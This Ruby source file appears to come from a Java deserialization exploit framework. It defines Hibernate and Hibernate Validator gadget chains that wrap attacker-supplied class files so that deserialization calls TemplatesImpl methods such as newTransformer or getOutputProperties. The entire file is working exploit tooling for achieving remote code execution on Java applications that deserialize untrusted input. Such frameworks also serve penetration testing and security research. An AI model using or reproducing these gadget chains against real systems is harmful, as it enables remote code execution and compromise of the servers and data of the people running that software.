# -*- coding: binary -*-
require_relative '../../payloads/hibernate'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization 
class HibernateValidator < S::Generator::Gadget
  def id
    'hibernate-validator'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('hibernate-validator')

    unless ctx.class?('org.springframework.aop.framework.JdkDynamicAopProxy')
      # currently only supported option
      # can be replaced with other passthrough proxies
    end

    unless params.fetch('classfiles', nil).nil?
      return false unless S::Generator::Templates.supported(ctx,params)
    end

    true
  end

  def create(ctx, params: {})
    if ctx.flag?('hibernate-validator5') ||
       ctx.class?('org.hibernate.validator.internal.util.annotationfactory.AnnotationProxy')
      ver = 5
    elsif ctx.flag?('hibernate-validator6') ||
          ctx.class?('org.hibernate.validator.internal.util.annotation.AnnotationProxy')
      ver = 6
    else
      raise 'Unsupported'
    end
    ctx.reg.load('model/corba.json');

    # TODO: add abstraction for delegate proxy construction
    if ctx.class?('org.springframework.aop.framework.JdkDynamicAopProxy')
      ctx.reg.load('model/spring-4.json');
    end

    if !params.fetch('classfiles', nil).nil?
      S::Payloads::Hibernate.validator_invoke_noarg(
        S::Generator::Templates.make(ctx,params), 
        'Ljavax/xml/transform/Templates;', 
        'newTransformer', 
        ver: ver)
    else
      raise 'Missing parameters'
    end
  end
end

class Hibernate < S::Generator::Gadget
  def id
    'hibernate'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('hibernate')

    unless params.fetch('classfiles', nil).nil?
      return false unless S::Payloads::Templates.supported(ctx,params)
    end

    true
  end

  def create(ctx, params: {})
    if ctx.flag?('hibernate3') ||
       ctx.class?('org.hibernate.tuple.component.ComponentEntityModeToTuplizerMapping')
      ctx.reg.load('model/hibernate-3.json')
      ver = 3
    elsif ctx.flag?('hibernate5') ||
          ctx.class?('org.hibernate.property.access.spi.Getter')
      ctx.reg.load('model/hibernate-5.json')
      ver = 5
    else
      ctx.reg.load('model/hibernate-4.json')
      ver = 4
    end

    if !params.fetch('classfiles', nil).nil?
      S::Payloads::Hibernate.hibernate_invoke_noarg(
        S::Generator::Templates.make(params['classfiles']), 
        'Ljavax/xml/transform/Templates;', 
        'getOutputProperties', 
        ver: ver)
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  HibernateValidator.new
)

S::Generator.register(
  Hibernate.new
)
